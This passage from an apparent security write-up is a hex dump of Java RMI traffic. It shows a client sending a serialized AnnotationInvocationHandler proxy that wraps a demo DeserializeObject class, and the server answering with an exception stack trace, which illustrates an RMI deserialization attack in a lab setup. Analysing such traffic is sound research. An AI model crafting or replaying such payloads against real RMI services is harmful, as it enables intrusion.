class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">00000000  4a 52 4d 49 00 02 4b                               JRMI..K</span><br><span class="line">    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 c1 c2   N..127.0 .0.1....</span><br><span class="line">00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....</span><br><span class="line">00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 02 00   P....w&quot;. ........</span><br><span class="line">00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000036  01 f6 b6 89 8d 8b f2 86  43 75 72 00 18 5b 4c 6a   ........ Cur..[Lj</span><br><span class="line">00000046  61 76 61 2e 72 6d 69 2e  73 65 72 76 65 72 2e 4f   ava.rmi. server.O</span><br><span class="line">00000056  62 6a 49 44 3b 87 13 00  b8 d0 2c 64 7e 02 00 00   bjID;... ..,d~...</span><br><span class="line">00000066  70 78 70 00 00 00 01 73  72 00 15 6a 61 76 61 2e   pxp....s r..java.</span><br><span class="line">00000076  72 6d 69 2e 73 65 72 76  65 72 2e 4f 62 6a 49 44   rmi.serv er.ObjID</span><br><span class="line">00000086  a7 5e fa 12 8d dc e5 5c  02 00 02 4a 00 06 6f 62   .^.....\ ...J..ob</span><br><span class="line">00000096  6a 4e 75 6d 4c 00 05 73  70 61 63 65 74 00 15 4c   jNumL..s pacet..L</span><br><span class="line">000000A6  6a 61 76 61 2f 72 6d 69  2f 73 65 72 76 65 72 2f   java&#x2F;rmi &#x2F;server&#x2F;</span><br><span class="line">000000B6  55 49 44 3b 70 78 70 27  2e 2f a2 08 49 09 8f 73   UID;pxp&#39; .&#x2F;..I..s</span><br><span class="line">000000C6  72 00 13 6a 61 76 61 2e  72 6d 69 2e 73 65 72 76   r..java. rmi.serv</span><br><span class="line">000000D6  65 72 2e 55 49 44 0f 12  70 0d bf 36 4f 12 02 00   er.UID.. p..6O...</span><br><span class="line">000000E6  03 53 00 05 63 6f 75 6e  74 4a 00 04 74 69 6d 65   .S..coun tJ..time</span><br><span class="line">000000F6  49 00 06 75 6e 69 71 75  65 70 78 70 80 01 00 00   I..uniqu epxp....</span><br><span class="line">00000106  01 70 5d a6 5c 22 ab a0  76 97 77 08 80 00 00 00   .p].\&quot;.. v.w.....</span><br><span class="line">00000116  00 00 00 00 73 72 00 12  6a 61 76 61 2e 72 6d 69   ....sr.. java.rmi</span><br><span class="line">00000126  2e 64 67 63 2e 4c 65 61  73 65 b0 b5 e2 66 0c 4a   .dgc.Lea se...f.J</span><br><span class="line">00000136  dc 34 02 00 02 4a 00 05  76 61 6c 75 65 4c 00 04   .4...J.. valueL..</span><br><span class="line">00000146  76 6d 69 64 74 00 13 4c  6a 61 76 61 2f 72 6d 69   vmidt..L java&#x2F;rmi</span><br><span class="line">00000156  2f 64 67 63 2f 56 4d 49  44 3b 70 78 70 00 00 00   &#x2F;dgc&#x2F;VMI D;pxp...</span><br><span class="line">00000166  00 00 09 27 c0 73 72 00  11 6a 61 76 61 2e 72 6d   ...&#39;.sr. .java.rm</span><br><span class="line">00000176  69 2e 64 67 63 2e 56 4d  49 44 f8 86 5b af a4 a5   i.dgc.VM ID..[...</span><br><span class="line">00000186  6d b6 02 00 02 5b 00 04  61 64 64 72 74 00 02 5b   m....[.. addrt..[</span><br><span class="line">00000196  42 4c 00 03 75 69 64 71  00 7e 00 03 70 78 70 75   BL..uidq .~..pxpu</span><br><span class="line">000001A6  72 00 02 5b 42 ac f3 17  f8 06 08 54 e0 02 00 00   r..[B... ...T....</span><br><span class="line">000001B6  70 78 70 00 00 00 08 f7  88 3b 04 59 fc a2 27 73   pxp..... .;.Y..&#39;s</span><br><span class="line">000001C6  71 00 7e 00 05 80 01 00  00 01 70 5d aa ea e5 dd   q.~..... ..p]....</span><br><span class="line">000001D6  bd ea 1a                                           ...</span><br><span class="line">    00000010  51 ac ed 00 05 77 0f 01  ab a0 76 97 00 00 01 70   Q....w.. ..v....p</span><br><span class="line">    00000020  5d a6 5c 22 80 05 73 72  00 12 6a 61 76 61 2e 72   ].\&quot;..sr ..java.r</span><br><span class="line">    00000030  6d 69 2e 64 67 63 2e 4c  65 61 73 65 b0 b5 e2 66   mi.dgc.L ease...f</span><br><span class="line">    00000040  0c 4a dc 34 02 00 02 4a  00 05 76 61 6c 75 65 4c   .J.4...J ..valueL</span><br><span class="line">    00000050  00 04 76 6d 69 64 74 00  13 4c 6a 61 76 61 2f 72   ..vmidt. .Ljava&#x2F;r</span><br><span class="line">    00000060  6d 69 2f 64 67 63 2f 56  4d 49 44 3b 70 78 70 00   mi&#x2F;dgc&#x2F;V MID;pxp.</span><br><span class="line">    00000070  00 00 00 00 09 27 c0 73  72 00 11 6a 61 76 61 2e   .....&#39;.s r..java.</span><br><span class="line">    00000080  72 6d 69 2e 64 67 63 2e  56 4d 49 44 f8 86 5b af   rmi.dgc. VMID..[.</span><br><span class="line">    00000090  a4 a5 6d b6 02 00 02 5b  00 04 61 64 64 72 74 00   ..m....[ ..addrt.</span><br><span class="line">    000000A0  02 5b 42 4c 00 03 75 69  64 74 00 15 4c 6a 61 76   .[BL..ui dt..Ljav</span><br><span class="line">    000000B0  61 2f 72 6d 69 2f 73 65  72 76 65 72 2f 55 49 44   a&#x2F;rmi&#x2F;se rver&#x2F;UID</span><br><span class="line">    000000C0  3b 70 78 70 75 72 00 02  5b 42 ac f3 17 f8 06 08   ;pxpur.. [B......</span><br><span class="line">    000000D0  54 e0 02 00 00 70 78 70  00 00 00 08 f7 88 3b 04   T....pxp ......;.</span><br><span class="line">    000000E0  59 fc a2 27 73 72 00 13  6a 61 76 61 2e 72 6d 69   Y..&#39;sr.. java.rmi</span><br><span class="line">    000000F0  2e 73 65 72 76 65 72 2e  55 49 44 0f 12 70 0d bf   .server. UID..p..</span><br><span class="line">    00000100  36 4f 12 02 00 03 53 00  05 63 6f 75 6e 74 4a 00   6O....S. .countJ.</span><br><span class="line">    00000110  04 74 69 6d 65 49 00 06  75 6e 69 71 75 65 70 78   .timeI.. uniquepx</span><br><span class="line">    00000120  70 80 01 00 00 01 70 5d  aa ea e5 dd bd ea 1a      p.....p] .......</span><br><span class="line">000001D9  52                                                 R</span><br><span class="line">    0000012F  53                                                 S</span><br><span class="line">000001DA  50 ac ed 00 05 77 22 27  2e 2f a2 08 49 09 8f ab   P....w&quot;&#39; .&#x2F;..I...</span><br><span class="line">000001EA  a0 76 97 00 00 01 70 5d  a6 5c 22 80 01 ff ff ff   .v....p] .\&quot;.....</span><br><span class="line">000001FA  ff d9 0d 2f 12 e0 71 7f  42 73 7d 00 00 00 01 00   ...&#x2F;..q. Bs&#125;.....</span><br><span class="line">0000020A  11 64 65 6d 6f 2e 72 6d  62 31 32 32 2e 44 75 6d   .demo.rm b122.Dum</span><br><span class="line">0000021A  6d 79 70 78 72 00 17 6a  61 76 61 2e 6c 61 6e 67   mypxr..j ava.lang</span><br><span class="line">0000022A  2e 72 65 66 6c 65 63 74  2e 50 72 6f 78 79 e1 27   .reflect .Proxy.&#39;</span><br><span class="line">0000023A  da 20 cc 10 43 cb 02 00  01 4c 00 01 68 74 00 25   . ..C... .L..ht.%</span><br><span class="line">0000024A  4c 6a 61 76 61 2f 6c 61  6e 67 2f 72 65 66 6c 65   Ljava&#x2F;la ng&#x2F;refle</span><br><span class="line">0000025A  63 74 2f 49 6e 76 6f 63  61 74 69 6f 6e 48 61 6e   ct&#x2F;Invoc ationHan</span><br><span class="line">0000026A  64 6c 65 72 3b 70 78 70  73 72 00 32 73 75 6e 2e   dler;pxp sr.2sun.</span><br><span class="line">0000027A  72 65 66 6c 65 63 74 2e  61 6e 6e 6f 74 61 74 69   reflect. annotati</span><br><span class="line">0000028A  6f 6e 2e 41 6e 6e 6f 74  61 74 69 6f 6e 49 6e 76   on.Annot ationInv</span><br><span class="line">0000029A  6f 63 61 74 69 6f 6e 48  61 6e 64 6c 65 72 55 ca   ocationH andlerU.</span><br><span class="line">000002AA  f5 0f 15 cb 7e a5 02 00  02 4c 00 0c 6d 65 6d 62   ....~... .L..memb</span><br><span class="line">000002BA  65 72 56 61 6c 75 65 73  74 00 0f 4c 6a 61 76 61   erValues t..Ljava</span><br><span class="line">000002CA  2f 75 74 69 6c 2f 4d 61  70 3b 4c 00 04 74 79 70   &#x2F;util&#x2F;Ma p;L..typ</span><br><span class="line">000002DA  65 74 00 11 4c 6a 61 76  61 2f 6c 61 6e 67 2f 43   et..Ljav a&#x2F;lang&#x2F;C</span><br><span class="line">000002EA  6c 61 73 73 3b 70 78 70  73 72 00 11 6a 61 76 61   lass;pxp sr..java</span><br><span class="line">000002FA  2e 75 74 69 6c 2e 48 61  73 68 4d 61 70 05 07 da   .util.Ha shMap...</span><br><span class="line">0000030A  c1 c3 16 60 d1 03 00 02  46 00 0a 6c 6f 61 64 46   ...&#96;.... F..loadF</span><br><span class="line">0000031A  61 63 74 6f 72 49 00 09  74 68 72 65 73 68 6f 6c   actorI.. threshol</span><br><span class="line">0000032A  64 70 78 70 3f 40 00 00  00 00 00 0c 77 08 00 00   dpxp?@.. ....w...</span><br><span class="line">0000033A  00 10 00 00 00 01 74 00  03 61 61 61 73 72 00 1d   ......t. .aaasr..</span><br><span class="line">0000034A  64 65 6d 6f 2e 72 6d 62  31 32 32 2e 44 65 73 65   demo.rmb 122.Dese</span><br><span class="line">0000035A  72 69 61 6c 69 7a 65 4f  62 6a 65 63 74 e7 b9 28   rializeO bject..(</span><br><span class="line">0000036A  12 38 24 61 0c 02 00 00  70 78 70 78 76 72 00 14   .8$a.... pxpxvr..</span><br><span class="line">0000037A  6a 61 76 61 2e 6c 61 6e  67 2e 44 65 70 72 65 63   java.lan g.Deprec</span><br><span class="line">0000038A  61 74 65 64 00 00 00 00  00 00 00 00 00 00 00 70   ated.... .......p</span><br><span class="line">0000039A  78 70                                              xp</span><br><span class="line">    00000130  51 ac ed 00 05 77 0f 02  ab a0 76 97 00 00 01 70   Q....w.. ..v....p</span><br><span class="line">    00000140  5d a6 5c 22 80 06 73 72  00 1e 6a 61 76 61 2e 6c   ].\&quot;..sr ..java.l</span><br><span class="line">    00000150  61 6e 67 2e 4e 75 6c 6c  50 6f 69 6e 74 65 72 45   ang.Null PointerE</span><br><span class="line">    00000160  78 63 65 70 74 69 6f 6e  47 a5 a1 8e ff 31 e1 b8   xception G....1..</span><br><span class="line">    00000170  02 00 00 70 78 72 00 1a  6a 61 76 61 2e 6c 61 6e   ...pxr.. java.lan</span><br><span class="line">    00000180  67 2e 52 75 6e 74 69 6d  65 45 78 63 65 70 74 69   g.Runtim eExcepti</span><br><span class="line">    00000190  6f 6e 9e 5f 06 47 0a 34  83 e5 02 00 00 70 78 72   on._.G.4 .....pxr</span><br><span class="line">    000001A0  00 13 6a 61 76 61 2e 6c  61 6e 67 2e 45 78 63 65   ..java.l ang.Exce</span><br><span class="line">    000001B0  70 74 69 6f 6e d0 fd 1f  3e 1a 3b 1c c4 02 00 00   ption... &gt;.;.....</span><br><span class="line">    000001C0  70 78 72 00 13 6a 61 76  61 2e 6c 61 6e 67 2e 54   pxr..jav a.lang.T</span><br><span class="line">    000001D0  68 72 6f 77 61 62 6c 65  d5 c6 35 27 39 77 b8 cb   hrowable ..5&#39;9w..</span><br><span class="line">    000001E0  03 00 04 4c 00 05 63 61  75 73 65 74 00 15 4c 6a   ...L..ca uset..Lj</span><br><span class="line">    000001F0  61 76 61 2f 6c 61 6e 67  2f 54 68 72 6f 77 61 62   ava&#x2F;lang &#x2F;Throwab</span><br><span class="line">    00000200  6c 65 3b 4c 00 0d 64 65  74 61 69 6c 4d 65 73 73   le;L..de tailMess</span><br><span class="line">    00000210  61 67 65 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67   aget..Lj ava&#x2F;lang</span><br><span class="line">    00000220  2f 53 74 72 69 6e 67 3b  5b 00 0a 73 74 61 63 6b   &#x2F;String; [..stack</span><br><span class="line">    00000230  54 72 61 63 65 74 00 1e  5b 4c 6a 61 76 61 2f 6c   Tracet.. [Ljava&#x2F;l</span><br><span class="line">    00000240  61 6e 67 2f 53 74 61 63  6b 54 72 61 63 65 45 6c   ang&#x2F;Stac kTraceEl</span><br><span class="line">    00000250  65 6d 65 6e 74 3b 4c 00  14 73 75 70 70 72 65 73   ement;L. .suppres</span><br><span class="line">    00000260  73 65 64 45 78 63 65 70  74 69 6f 6e 73 74 00 10   sedExcep tionst..</span><br><span class="line">    00000270  4c 6a 61 76 61 2f 75 74  69 6c 2f 4c 69 73 74 3b   Ljava&#x2F;ut il&#x2F;List;</span><br><span class="line">    00000280  70 78 70 71 00 7e 00 08  70 75 72 00 1e 5b 4c 6a   pxpq.~.. pur..[Lj</span><br><span class="line">    00000290  61 76 61 2e 6c 61 6e 67  2e 53 74 61 63 6b 54 72   ava.lang .StackTr</span><br><span class="line">    000002A0  61 63 65 45 6c 65 6d 65  6e 74 3b 02 46 2a 3c 3c   aceEleme nt;.F*&lt;&lt;</span><br><span class="line">    000002B0  fd 22 39 02 00 00 70 78  70 00 00 00 17 73 72 00   .&quot;9...px p....sr.</span><br><span class="line">    000002C0  1b 6a 61 76 61 2e 6c 61  6e 67 2e 53 74 61 63 6b   .java.la ng.Stack</span><br><span class="line">    000002D0  54 72 61 63 65 45 6c 65  6d 65 6e 74 61 09 c5 9a   TraceEle menta...</span><br><span class="line">    000002E0  26 36 dd 85 02 00 08 42  00 06 66 6f 72 6d 61 74   &amp;6.....B ..format</span><br><span class="line">    000002F0  49 00 0a 6c 69 6e 65 4e  75 6d 62 65 72 4c 00 0f   I..lineN umberL..</span><br><span class="line">    00000300  63 6c 61 73 73 4c 6f 61  64 65 72 4e 61 6d 65 71   classLoa derNameq</span><br><span class="line">    00000310  00 7e 00 05 4c 00 0e 64  65 63 6c 61 72 69 6e 67   .~..L..d eclaring</span><br><span class="line">    00000320  43 6c 61 73 73 71 00 7e  00 05 4c 00 08 66 69 6c   Classq.~ ..L..fil</span><br><span class="line">    00000330  65 4e 61 6d 65 71 00 7e  00 05 4c 00 0a 6d 65 74   eNameq.~ ..L..met</span><br><span class="line">    00000340  68 6f 64 4e 61 6d 65 71  00 7e 00 05 4c 00 0a 6d   hodNameq .~..L..m</span><br><span class="line">    00000350  6f 64 75 6c 65 4e 61 6d  65 71 00 7e 00 05 4c 00   oduleNam eq.~..L.</span><br><span class="line">    00000360  0d 6d 6f 64 75 6c 65 56  65 72 73 69 6f 6e 71 00   .moduleV ersionq.</span><br><span class="line">    00000370  7e 00 05 70 78 70 02 00  00 00 a6 70 74 00 32 73   ~..pxp.. ...pt.2s</span><br><span class="line">    00000380  75 6e 2e 72 65 66 6c 65  63 74 2e 61 6e 6e 6f 74   un.refle ct.annot</span><br><span class="line">    00000390  61 74 69 6f 6e 2e 41 6e  6e 6f 74 61 74 69 6f 6e   ation.An notation</span><br><span class="line">    000003A0  49 6e 76 6f 63 61 74 69  6f 6e 48 61 6e 64 6c 65   Invocati onHandle</span><br><span class="line">    000003B0  72 74 00 20 41 6e 6e 6f  74 61 74 69 6f 6e 49 6e   rt. Anno tationIn</span><br><span class="line">    000003C0  76 6f 63 61 74 69 6f 6e  48 61 6e 64 6c 65 72 2e   vocation Handler.</span><br><span class="line">    000003D0  6a 61 76 61 74 00 13 6d  65 6d 62 65 72 56 61 6c   javat..m emberVal</span><br><span class="line">    000003E0  75 65 54 6f 53 74 72 69  6e 67 74 00 09 6a 61 76   ueToStri ngt..jav</span><br><span class="line">    000003F0  61 2e 62 61 73 65 74 00  06 31 31 2e 30 2e 36 73   a.baset. .11.0.6s</span><br><span class="line">    00000400  71 00 7e 00 0b 02 00 00  00 9c 70 71 00 7e 00 0d   q.~..... ..pq.~..</span><br><span class="line">    00000410  71 00 7e 00 0e 74 00 0c  74 6f 53 74 72 69 6e 67   q.~..t.. toString</span><br><span class="line">    00000420  49 6d 70 6c 71 00 7e 00  10 71 00 7e 00 11 73 71   Implq.~. .q.~..sq</span><br><span class="line">    00000430  00 7e 00 0b 02 00 00 00  48 70 71 00 7e 00 0d 71   .~...... Hpq.~..q</span><br><span class="line">    00000440  00 7e 00 0e 74 00 06 69  6e 76 6f 6b 65 71 00 7e   .~..t..i nvokeq.~</span><br><span class="line">    00000450  00 10 71 00 7e 00 11 73  71 00 7e 00 0b 01 ff ff   ..q.~..s q.~.....</span><br><span class="line">    00000460  ff ff 74 00 03 61 70 70  74 00 15 63 6f 6d 2e 73   ..t..app t..com.s</span><br><span class="line">    00000470  75 6e 2e 70 72 6f 78 79  2e 24 50 72 6f 78 79 31   un.proxy .$Proxy1</span><br><span class="line">    00000480  70 74 00 08 74 6f 53 74  72 69 6e 67 70 70 73 71   pt..toSt ringppsq</span><br><span class="line">    00000490  00 7e 00 0b 02 00 00 0b  87 70 74 00 10 6a 61 76   .~...... .pt..jav</span><br><span class="line">    000004A0  61 2e 6c 61 6e 67 2e 53  74 72 69 6e 67 74 00 0b   a.lang.S tringt..</span><br><span class="line">    000004B0  53 74 72 69 6e 67 2e 6a  61 76 61 74 00 07 76 61   String.j avat..va</span><br><span class="line">    000004C0  6c 75 65 4f 66 71 00 7e  00 10 71 00 7e 00 11 73   lueOfq.~ ..q.~..s</span><br><span class="line">    000004D0  71 00 7e 00 0b 01 00 00  00 06 71 00 7e 00 17 74   q.~..... ..q.~..t</span><br><span class="line">    000004E0  00 1a 64 65 6d 6f 2e 72  6d 62 31 32 32 2e 54 65   ..demo.r mb122.Te</span><br><span class="line">    000004F0  73 74 4f 62 6a 65 63 74  49 6d 70 6c 74 00 13 54   stObject Implt..T</span><br><span class="line">    00000500  65 73 74 4f 62 6a 65 63  74 49 6d 70 6c 2e 6a 61   estObjec tImpl.ja</span><br><span class="line">    00000510  76 61 74 00 06 63 61 6c  6c 4d 65 70 70 73 71 00   vat..cal lMeppsq.</span><br><span class="line">    00000520  7e 00 0b 02 ff ff ff fe  70 74 00 2d 6a 64 6b 2e   ~....... pt.-jdk.</span><br><span class="line">    00000530  69 6e 74 65 72 6e 61 6c  2e 72 65 66 6c 65 63 74   internal .reflect</span><br><span class="line">    00000540  2e 4e 61 74 69 76 65 4d  65 74 68 6f 64 41 63 63   .NativeM ethodAcc</span><br><span class="line">    00000550  65 73 73 6f 72 49 6d 70  6c 74 00 1d 4e 61 74 69   essorImp lt..Nati</span><br><span class="line">    00000560  76 65 4d 65 74 68 6f 64  41 63 63 65 73 73 6f 72   veMethod Accessor</span><br><span class="line">    00000570  49 6d 70 6c 2e 6a 61 76  61 74 00 07 69 6e 76 6f   Impl.jav at..invo</span><br><span class="line">    00000580  6b 65 30 71 00 7e 00 10  71 00 7e 00 11 73 71 00   ke0q.~.. q.~..sq.</span><br><span class="line">    00000590  7e 00 0b 02 00 00 00 3e  70 71 00 7e 00 23 71 00   ~......&gt; pq.~.#q.</span><br><span class="line">    000005A0  7e 00 24 71 00 7e 00 15  71 00 7e 00 10 71 00 7e   ~.$q.~.. q.~..q.~</span><br><span class="line">    000005B0  00 11 73 71 00 7e 00 0b  02 00 00 00 2b 70 74 00   ..sq.~.. ....+pt.</span><br><span class="line">    000005C0  31 6a 64 6b 2e 69 6e 74  65 72 6e 61 6c 2e 72 65   1jdk.int ernal.re</span><br><span class="line">    000005D0  66 6c 65 63 74 2e 44 65  6c 65 67 61 74 69 6e 67   flect.De legating</span><br><span class="line">    000005E0  4d 65 74 68 6f 64 41 63  63 65 73 73 6f 72 49 6d   MethodAc cessorIm</span><br><span class="line">    000005F0  70 6c 74 00 21 44 65 6c  65 67 61 74 69 6e 67 4d   plt.!Del egatingM</span><br><span class="line">    00000600  65 74 68 6f 64 41 63 63  65 73 73 6f 72 49 6d 70   ethodAcc essorImp</span><br><span class="line">    00000610  6c 2e 6a 61 76 61 71 00  7e 00 15 71 00 7e 00 10   l.javaq. ~..q.~..</span><br><span class="line">    00000620  71 00 7e 00 11 73 71 00  7e 00 0b 02 00 00 02 36   q.~..sq. ~......6</span><br><span class="line">    00000630  70 74 00 18 6a 61 76 61  2e 6c 61 6e 67 2e 72 65   pt..java .lang.re</span><br><span class="line">    00000640  66 6c 65 63 74 2e 4d 65  74 68 6f 64 74 00 0b 4d   flect.Me thodt..M</span><br><span class="line">    00000650  65 74 68 6f 64 2e 6a 61  76 61 71 00 7e 00 15 71   ethod.ja vaq.~..q</span><br><span class="line">    00000660  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...</span><br><span class="line">    00000670  00 00 01 67 70 74 00 1f  73 75 6e 2e 72 6d 69 2e   ...gpt.. sun.rmi.</span><br><span class="line">    00000680  73 65 72 76 65 72 2e 55  6e 69 63 61 73 74 53 65   server.U nicastSe</span><br><span class="line">    00000690  72 76 65 72 52 65 66 74  00 15 55 6e 69 63 61 73   rverReft ..Unicas</span><br><span class="line">    000006A0  74 53 65 72 76 65 72 52  65 66 2e 6a 61 76 61 74   tServerR ef.javat</span><br><span class="line">    000006B0  00 08 64 69 73 70 61 74  63 68 74 00 08 6a 61 76   ..dispat cht..jav</span><br><span class="line">    000006C0  61 2e 72 6d 69 71 00 7e  00 11 73 71 00 7e 00 0b   a.rmiq.~ ..sq.~..</span><br><span class="line">    000006D0  02 00 00 00 c8 70 74 00  1d 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi</span><br><span class="line">    000006E0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans</span><br><span class="line">    000006F0  70 6f 72 74 24 31 74 00  0e 54 72 61 6e 73 70 6f   port$1t. .Transpo</span><br><span class="line">    00000700  72 74 2e 6a 61 76 61 74  00 03 72 75 6e 71 00 7e   rt.javat ..runq.~</span><br><span class="line">    00000710  00 31 71 00 7e 00 11 73  71 00 7e 00 0b 02 00 00   .1q.~..s q.~.....</span><br><span class="line">    00000720  00 c5 70 71 00 7e 00 33  71 00 7e 00 34 71 00 7e   ..pq.~.3 q.~.4q.~</span><br><span class="line">    00000730  00 35 71 00 7e 00 31 71  00 7e 00 11 73 71 00 7e   .5q.~.1q .~..sq.~</span><br><span class="line">    00000740  00 0b 02 ff ff ff fe 70  74 00 1e 6a 61 76 61 2e   .......p t..java.</span><br><span class="line">    00000750  73 65 63 75 72 69 74 79  2e 41 63 63 65 73 73 43   security .AccessC</span><br><span class="line">    00000760  6f 6e 74 72 6f 6c 6c 65  72 74 00 15 41 63 63 65   ontrolle rt..Acce</span><br><span class="line">    00000770  73 73 43 6f 6e 74 72 6f  6c 6c 65 72 2e 6a 61 76   ssContro ller.jav</span><br><span class="line">    00000780  61 74 00 0c 64 6f 50 72  69 76 69 6c 65 67 65 64   at..doPr ivileged</span><br><span class="line">    00000790  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..</span><br><span class="line">    000007A0  02 00 00 00 c4 70 74 00  1b 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi</span><br><span class="line">    000007B0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans</span><br><span class="line">    000007C0  70 6f 72 74 71 00 7e 00  34 74 00 0b 73 65 72 76   portq.~. 4t..serv</span><br><span class="line">    000007D0  69 63 65 43 61 6c 6c 71  00 7e 00 31 71 00 7e 00   iceCallq .~.1q.~.</span><br><span class="line">    000007E0  11 73 71 00 7e 00 0b 02  00 00 02 32 70 74 00 22   .sq.~... ...2pt.&quot;</span><br><span class="line">    000007F0  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor</span><br><span class="line">    00000800  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo</span><br><span class="line">    00000810  72 74 74 00 11 54 43 50  54 72 61 6e 73 70 6f 72   rtt..TCP Transpor</span><br><span class="line">    00000820  74 2e 6a 61 76 61 74 00  0e 68 61 6e 64 6c 65 4d   t.javat. .handleM</span><br><span class="line">    00000830  65 73 73 61 67 65 73 71  00 7e 00 31 71 00 7e 00   essagesq .~.1q.~.</span><br><span class="line">    00000840  11 73 71 00 7e 00 0b 02  00 00 03 1c 70 74 00 34   .sq.~... ....pt.4</span><br><span class="line">    00000850  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor</span><br><span class="line">    00000860  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo</span><br><span class="line">    00000870  72 74 24 43 6f 6e 6e 65  63 74 69 6f 6e 48 61 6e   rt$Conne ctionHan</span><br><span class="line">    00000880  64 6c 65 72 71 00 7e 00  40 74 00 04 72 75 6e 30   dlerq.~. @t..run0</span><br><span class="line">    00000890  71 00 7e 00 31 71 00 7e  00 11 73 71 00 7e 00 0b   q.~.1q.~ ..sq.~..</span><br><span class="line">    000008A0  02 00 00 02 a5 70 71 00  7e 00 43 71 00 7e 00 40   .....pq. ~.Cq.~.@</span><br><span class="line">    000008B0  74 00 0c 6c 61 6d 62 64  61 24 72 75 6e 24 30 71   t..lambd a$run$0q</span><br><span class="line">    000008C0  00 7e 00 31 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~.1q.~. .sq.~...</span><br><span class="line">    000008D0  ff ff ff fe 70 71 00 7e  00 38 71 00 7e 00 39 71   ....pq.~ .8q.~.9q</span><br><span class="line">    000008E0  00 7e 00 3a 71 00 7e 00  10 71 00 7e 00 11 73 71   .~.:q.~. .q.~..sq</span><br><span class="line">    000008F0  00 7e 00 0b 02 00 00 